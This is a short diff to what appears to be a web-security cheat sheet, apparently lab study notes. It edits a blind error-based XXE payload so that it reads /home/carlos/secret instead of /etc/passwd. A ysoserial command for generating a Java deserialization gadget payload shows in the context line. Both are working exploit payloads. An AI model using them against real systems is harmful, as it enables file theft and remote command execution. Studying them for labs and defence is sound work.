@@ -48,7 +48,7 @@ java -jar ysoserial-all.jar CommonsBeanutils1 "CMD" | gzip | base64 -w0
 # XXE
 ```xml
 <!--Blind with errors-->
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///home/carlos/secret">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
 %eval;
 %error;
